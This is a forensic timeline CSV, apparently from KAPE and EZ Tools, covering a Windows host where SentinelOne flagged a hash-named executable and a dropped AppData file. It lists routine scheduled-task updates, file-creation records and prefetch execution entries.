2025-05-03T04:06:17.7987808,Event Time,Event Logs,EZ Tools,A scheduled task was updated,Security,"Channel: Security | Computer: DESKTOP-704R550 | TaskName: /Microsoft/Windows/UpdateOrchestrator/Schedule Work | TaskContentNew: &lt;?xml version='1.0' encoding='UTF-16'?&gt;, &lt;Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'&gt;,   &lt;RegistrationInfo&gt;,     &lt;URI&gt;/Microsoft/Windows/UpdateOrchestrator/Schedule Work&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FRFX;;;BA)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;TimeTrigger&gt;,       &lt;StartBoundary&gt;2025-05-03T05:23:17.000Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;/TimeTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id='Author'&gt;,       &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;Duration&gt;PT10M&lt;/Duration&gt;,       &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;false&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,   &lt;/Settings&gt;,   &lt;Actions Context='Author'&gt;,     &lt;Exec&gt;,       &lt;Command&gt;%systemroot%/system32/usoclient.exe&lt;/Command&gt;,       &lt;Arguments&gt;StartWork&lt;/Arguments&gt;,     &lt;/Exec&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,4702,WORKGROUP/DESKTOP-704R550$,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:16:18.2556232,Event Time,Event Logs,EZ Tools,A scheduled task was updated,Security,"Channel: Security | Computer: DESKTOP-704R550 | TaskName: /Microsoft/Windows/WindowsUpdate/Scheduled Start | TaskContentNew: &lt;?xml version='1.0' encoding='UTF-16'?&gt;, &lt;Task version='1.4' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'&gt;,   &lt;RegistrationInfo&gt;,     &lt;Source&gt;Microsoft Corporation.&lt;/Source&gt;,     &lt;Author&gt;Microsoft Corporation.&lt;/Author&gt;,     &lt;Description&gt;This task is used to start the Windows Update service when needed to perform scheduled operations such as scans.&lt;/Description&gt;,     &lt;URI&gt;/Microsoft/Windows/WindowsUpdate/Scheduled Start&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FA;;;BA)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;TimeTrigger&gt;,       &lt;StartBoundary&gt;2025-05-03T05:30:03Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,       &lt;RandomDelay&gt;PT1M&lt;/RandomDelay&gt;,     &lt;/TimeTrigger&gt;,     &lt;SessionStateChangeTrigger&gt;,       &lt;Enabled&gt;false&lt;/Enabled&gt;,       &lt;StateChange&gt;ConsoleDisconnect&lt;/StateChange&gt;,     &lt;/SessionStateChangeTrigger&gt;,     &lt;SessionStateChangeTrigger&gt;,       &lt;Enabled&gt;false&lt;/Enabled&gt;,       &lt;StateChange&gt;RemoteDisconnect&lt;/StateChange&gt;,     &lt;/SessionStateChangeTrigger&gt;,     &lt;WnfStateChangeTrigger&gt;,       &lt;Enabled&gt;false&lt;/Enabled&gt;,       &lt;StateName&gt;7508BCA3380C960C&lt;/StateName&gt;,       &lt;Data&gt;01&lt;/Data&gt;,       &lt;DataOffset&gt;0&lt;/DataOffset&gt;,     &lt;/WnfStateChangeTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id='LocalSystem'&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,       &lt;UserId&gt;NT AUTHORITY/SYSTEM&lt;/UserId&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;Duration&gt;PT10M&lt;/Duration&gt;,       &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;false&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;false&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;DisallowStartOnRemoteAppSession&gt;false&lt;/DisallowStartOnRemoteAppSession&gt;,     &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,   &lt;/Settings&gt;,   &lt;Actions Context='LocalSystem'&gt;,     &lt;Exec&gt;,       &lt;Command&gt;C:/Windows/system32/sc.exe&lt;/Command&gt;,       &lt;Arguments&gt;start wuauserv&lt;/Arguments&gt;,     &lt;/Exec&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,4702,WORKGROUP/DESKTOP-704R550$,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:22:32.2572640,Event Time,Event Logs,EZ Tools,A scheduled task was updated,Security,"Channel: Security | Computer: DESKTOP-704R550 | TaskName: /Microsoft/Windows/Flighting/OneSettings/RefreshCache | TaskContentNew: &lt;?xml version='1.0' encoding='UTF-16'?&gt;, &lt;Task version='1.6' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'&gt;,   &lt;RegistrationInfo&gt;,     &lt;Source&gt;$(@%systemroot%/system32/wosc.dll,-602)&lt;/Source&gt;,     &lt;Author&gt;$(@%systemroot%/system32/wosc.dll,-601)&lt;/Author&gt;,     &lt;Description&gt;$(@%systemroot%/system32/wosc.dll,-603)&lt;/Description&gt;,     &lt;URI&gt;/Microsoft/Windows/Flighting/OneSettings/RefreshCache&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FRFX;;;AU)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;TimeTrigger&gt;,       &lt;Repetition&gt;,         &lt;Interval&gt;PT402M&lt;/Interval&gt;,         &lt;StopAtDurationEnd&gt;false&lt;/StopAtDurationEnd&gt;,       &lt;/Repetition&gt;,       &lt;StartBoundary&gt;2025-05-03T09:52:32.237Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,       &lt;RandomDelay&gt;PT1H&lt;/RandomDelay&gt;,     &lt;/TimeTrigger&gt;,     &lt;WnfStateChangeTrigger&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,       &lt;StateName&gt;7538BCA33A019502&lt;/StateName&gt;,     &lt;/WnfStateChangeTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id='LocalSystem'&gt;,       &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;true&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;StopOnIdleEnd&gt;false&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;false&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;DisallowStartOnRemoteAppSession&gt;false&lt;/DisallowStartOnRemoteAppSession&gt;,     &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT5M&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,   &lt;/Settings&gt;,   &lt;Actions Context='LocalSystem'&gt;,     &lt;ComHandler&gt;,       &lt;ClassId&gt;{E07647F7-AED2-48D9-9720-939BC24A8A3C}&lt;/ClassId&gt;,     &lt;/ComHandler&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,4702,WORKGROUP/DESKTOP-704R550$,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:23:02.2208895,Event Time,Event Logs,EZ Tools,A scheduled task was updated,Security,"Channel: Security | Computer: DESKTOP-704R550 | TaskName: /Microsoft/Windows/SoftwareProtectionPlatform/SvcRestartTask | TaskContentNew: &lt;?xml version='1.0' encoding='UTF-16'?&gt;, &lt;Task version='1.6' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'&gt;,   &lt;RegistrationInfo&gt;,     &lt;Source&gt;$(@%systemroot%/system32/sppc.dll,-200)&lt;/Source&gt;,     &lt;Author&gt;$(@%systemroot%/system32/sppc.dll,-200)&lt;/Author&gt;,     &lt;Version&gt;1.0&lt;/Version&gt;,     &lt;Description&gt;$(@%systemroot%/system32/sppc.dll,-201)&lt;/Description&gt;,     &lt;URI&gt;/Microsoft/Windows/SoftwareProtectionPlatform/SvcRestartTask&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;S-1-5-80-123231216-2592883651-3715271367-3753151631-4175906628)(A;;FR;;;S-1-5-87-2912274048-3994893941-1669128114-1310430903-1263774323)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;CalendarTrigger&gt;,       &lt;StartBoundary&gt;2025-05-04T03:31:02Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,       &lt;ScheduleByDay&gt;,         &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;,       &lt;/ScheduleByDay&gt;,     &lt;/CalendarTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id='NetworkService'&gt;,       &lt;UserId&gt;S-1-5-20&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;true&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;DisallowStartOnRemoteAppSession&gt;false&lt;/DisallowStartOnRemoteAppSession&gt;,     &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,     &lt;RestartOnFailure&gt;,       &lt;Interval&gt;PT1M&lt;/Interval&gt;,       &lt;Count&gt;3&lt;/Count&gt;,     &lt;/RestartOnFailure&gt;,   &lt;/Settings&gt;,   &lt;Actions Context='NetworkService'&gt;,     &lt;ComHandler&gt;,       &lt;ClassId&gt;{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}&lt;/ClassId&gt;,       &lt;Data&gt;&lt;![CDATA[timer]]&gt;&lt;/Data&gt;,     &lt;/ComHandler&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,4702,WORKGROUP/DESKTOP-704R550$,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:00:25.9839532,Event Time,Event Logs,EZ Tools,Sentinel Threat Detected,SentinelOne/Operational,Channel: SentinelOne/Operational | Computer: DESKTOP-704R550 | Program: 479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe | C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe | windows.reputation,,31,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:00:54.2341157,Event Time,Event Logs,EZ Tools,Sentinel Threat Detected,SentinelOne/Operational,Channel: SentinelOne/Operational | Computer: DESKTOP-704R550 | Program: 479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe | C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe | windows.reputation,,31,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:26.0605358,Event Time,Event Logs,EZ Tools,Sentinel Threat Detected,SentinelOne/Operational,Channel: SentinelOne/Operational | Computer: DESKTOP-704R550 | Program: jisjq3fy.i340.exe | C:/Users/admin0x/AppData/Roaming/jisjq3fy.i340.exe | windows.reputation,,31,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-02T00:10:05.1817356,Created,MFT,EZ Tools,MFT Created,479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.zip,./Users/admin0x/AppData/Local/Temp/vmware-admin0x/VMwareDnD/6f55a34f/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.zip,zip,,,,17057,,,,,,FileSystem/20250503043805_MFTECmd_$MFT_Output.csv,
2025-05-03T04:00:04.4450608,Created,MFT,EZ Tools,MFT Created,479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.zip,./Users/admin0x/Desktop/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.zip,zip,,,,17057,,,,,,FileSystem/20250503043805_MFTECmd_$MFT_Output.csv,
2025-05-03T04:00:25.4767079,Created,MFT,EZ Tools,MFT Created,479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,./Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,exe,,,,36352,,,,,,FileSystem/20250503043805_MFTECmd_$MFT_Output.csv,
2025-05-03T04:01:04.1623331,Created,MFT,EZ Tools,MFT Created,jisjq3fy.i340.exe,./Users/admin0x/AppData/Roaming/jisjq3fy.i340.exe,exe,,,,940032,,,,,,FileSystem/20250503043805_MFTECmd_$MFT_Output.csv,
2025-05-03T04:00:53.4275094,Run Time,Prefetch,EZ Tools,Program Execution,479B3C923BE6125530E99F24E6115,479B3C923BE6125530E99F24E6115,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:41:16.9204292,Run Time,Prefetch,EZ Tools,Program Execution,AMCACHEPARSER.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/AMCACHEPARSER.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:41:19.7021133,Run Time,Prefetch,EZ Tools,Program Execution,APPCOMPATCACHEPARSER.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/APPCOMPATCACHEPARSER.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:45:02.4227718,Run Time,Prefetch,EZ Tools,Program Execution,DEFRAG.EXE,WINDOWS/SYSTEM32/DEFRAG.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:41:50.4215215,Run Time,Prefetch,EZ Tools,Program Execution,EVTXECMD.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/EVTXECMD/EVTXECMD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T04:01:05.3407095,Run Time,Prefetch,EZ Tools,Program Execution,JISJQ3FY.I340.EXE,USERS/ADMIN0X/APPDATA/ROAMING/JISJQ3FY.I340.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:42:03.2487795,Run Time,Prefetch,EZ Tools,Program Execution,JLECMD.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/JLECMD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T04:37:07.0285911,Run Time,Prefetch,EZ Tools,Program Execution,KAPE.EXE,USERS/ADMIN0X/DESKTOP/KAPE/KAPE.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:40:31.1075380,Run Time,Prefetch,EZ Tools,Program Execution,KAPE.EXE,USERS/ADMIN0X/DESKTOP/KAPE/KAPE.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:42:05.7653985,Run Time,Prefetch,EZ Tools,Program Execution,LECMD.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/LECMD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:41:46.0767707,Run Time,Prefetch,EZ Tools,Program Execution,MFTECMD.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/MFTECMD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:41:38.1865755,Run Time,Prefetch,EZ Tools,Program Execution,MFTECMD.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/MFTECMD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:41:25.4828714,Run Time,Prefetch,EZ Tools,Program Execution,MFTECMD.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/MFTECMD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:41:23.2806651,Run Time,Prefetch,EZ Tools,Program Execution,MFTECMD.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/MFTECMD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T04:01:09.4872877,Run Time,Prefetch,EZ Tools,Program Execution,MSBUILD.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK/V4.0.30319/MSBUILD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:46:22.3154835,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK64/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:46:22.2042770,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK64/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:46:09.3448781,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK64/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:46:00.5793778,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK64/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:45:58.0016040,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK64/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:45:56.8291483,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK64/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:45:56.6886453,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK64/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:45:56.4249787,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK64/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:45:30.0174417,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:45:29.8914828,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:45:21.5321364,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:45:21.3446068,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:45:15.8132166,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:45:14.0635607,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:45:13.8601452,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:45:13.7664862,Run Time,Prefetch,EZ Tools,Program Execution,MSCORSVW.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK/V4.0.30319/MSCORSVW.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T04:02:12.5131747,Run Time,Prefetch,EZ Tools,Program Execution,MSEDGEWEBVIEW2.EXE,PROGRAM FILES (X86)/MICROSOFT/EDGEWEBVIEW/APPLICATION/135.0.3179.98/MSEDGEWEBVIEW2.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T04:02:15.4012202,Run Time,Prefetch,EZ Tools,Program Execution,MSEDGEWEBVIEW2.EXE,PROGRAM FILES (X86)/MICROSOFT/EDGEWEBVIEW/APPLICATION/135.0.3179.98/MSEDGEWEBVIEW2.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T04:02:13.9891647,Run Time,Prefetch,EZ Tools,Program Execution,MSEDGEWEBVIEW2.EXE,PROGRAM FILES (X86)/MICROSOFT/EDGEWEBVIEW/APPLICATION/135.0.3179.98/MSEDGEWEBVIEW2.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T04:02:14.5891892,Run Time,Prefetch,EZ Tools,Program Execution,MSEDGEWEBVIEW2.EXE,PROGRAM FILES (X86)/MICROSOFT/EDGEWEBVIEW/APPLICATION/135.0.3179.98/MSEDGEWEBVIEW2.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T04:02:12.6492243,Run Time,Prefetch,EZ Tools,Program Execution,MSEDGEWEBVIEW2.EXE,PROGRAM FILES (X86)/MICROSOFT/EDGEWEBVIEW/APPLICATION/135.0.3179.98/MSEDGEWEBVIEW2.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T04:02:15.2892701,Run Time,Prefetch,EZ Tools,Program Execution,MSEDGEWEBVIEW2.EXE,PROGRAM FILES (X86)/MICROSOFT/EDGEWEBVIEW/APPLICATION/135.0.3179.98/MSEDGEWEBVIEW2.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:45:40.5791077,Run Time,Prefetch,EZ Tools,Program Execution,NGEN.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK/V4.0.30319/NGEN.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:45:03.5006941,Run Time,Prefetch,EZ Tools,Program Execution,NGEN.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK/V4.0.30319/NGEN.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:47:12.1895068,Run Time,Prefetch,EZ Tools,Program Execution,NGEN.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK64/V4.0.30319/NGEN.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
